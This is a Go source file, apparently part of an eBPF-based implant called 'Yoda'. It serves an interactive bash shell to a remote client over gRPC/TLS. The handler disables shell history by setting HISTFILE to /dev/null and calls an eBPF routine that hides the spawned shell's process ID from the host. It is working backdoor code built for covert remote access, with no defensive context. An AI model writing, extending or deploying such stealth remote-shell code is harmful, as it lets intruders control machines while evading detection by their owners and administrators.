// TLS PTY session handler: launches interactive shell over TLS, manages terminal size and I/O
// Handler de session PTY TLS : lance un shell interactif via TLS, gère la taille du terminal et les flux I/O
package core

import (
	"fmt"
	"os/exec"

	"github.com/cezamee/Yoda/internal/core/ebpf"
	"github.com/cezamee/Yoda/internal/core/pb"
	"github.com/creack/pty"
)

// Handle a TLS PTY session: start bash, negotiate terminal size, and relay I/O
// Gère une session PTY TLS : démarre bash, négocie la taille du terminal, relaie les flux I/O
func (b *NetstackBridge) HandleTLSPTYSession(stream pb.PTYShell_ShellServer, _ string) {
	cmd := exec.Command("/bin/bash", "-l", "-i")
	cmd.Env = []string{
		"TERM=xterm-256color",
		"SHELL=/bin/bash",
		"LANG=en_US.UTF-8",
		"LC_ALL=en_US.UTF-8",
		"PS1=\\[\\033[01;32m\\]yoda@grpc\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$ ",
		"HISTFILE=/dev/null",
	}

	ptmx, err := pty.Start(cmd)
	if err != nil {
		fmt.Printf("❌ Failed to start PTY: %v\n", err)
		return
	}

	go func(pid int) {
		_, _, err := ebpf.HideOwnPIDs(pid)
		if err != nil {
			fmt.Printf("⚠️ Error hiding PID for bash: %v\n", err)
		}
	}(cmd.Process.Pid)

	defer func() {
		fmt.Printf("🧹 Cleaning up gRPC PTY session...\n")
		ptmx.Close()
		if cmd.Process != nil {
			fmt.Printf("🧹 Terminating bash process (PID: %d)\n", cmd.Process.Pid)
			cmd.Process.Kill()
			cmd.Wait()
			fmt.Printf("✅ Bash process cleaned up\n")
		}
	}()

	rows, cols := 24, 80
	in, err := stream.Recv()
	if err == nil && len(in.Data) > 0 {
		var r, c int
		nParsed, scanErr := fmt.Sscanf(string(in.Data), "\x1b[8;%d;%dt", &r, &c)
		if nParsed == 2 && scanErr == nil {
			rows, cols = r, c
		}
	}
	_ = pty.Setsize(ptmx, &pty.Winsize{Rows: uint16(rows), Cols: uint16(cols)})

	ptmx.Write([]byte("alias ls='ls --color=auto'\n"))
	ptmx.Write([]byte("clear\n"))

	done := make(chan struct{})

	// Goroutine: PTY -> gRPC (shell output to client)
	go func() {
		buffer := make([]byte, 4096)
		for {
			select {
			case <-done:
				return
			default:
				n, err := ptmx.Read(buffer)
				if err != nil {
					close(done)
					return
				}
				if n > 0 {
					_ = stream.Send(&pb.ShellData{Data: buffer[:n]})
				}
			}
		}
	}()

	// Main loop: gRPC -> PTY (client input to shell)
	for {
		select {
		case <-done:
			fmt.Printf("📡 gRPC PTY session ended\n")
			return
		default:
			in, err := stream.Recv()
			if err != nil {
				close(done)
				fmt.Printf("📡 gRPC stream closed: %v\n", err)
				return
			}
			if len(in.Data) > 0 {
				if string(in.Data) == string([]byte{4}) {
					close(done)
					fmt.Printf("📡 Ctrl+D received, closing PTY\n")
					return
				}
				_, err := ptmx.Write(in.Data)
				if err != nil {
					close(done)
					fmt.Printf("❌ Failed to write to PTY: %v\n", err)
					return
				}
			}
		}
	}
}

type PTYShellServerImpl struct {
	pb.UnimplementedPTYShellServer
	Bridge *NetstackBridge
}

// Shell gRPC handler
func (s *PTYShellServerImpl) Shell(stream pb.PTYShell_ShellServer) error {
	s.Bridge.HandleTLSPTYSession(stream, "")
	return nil
}
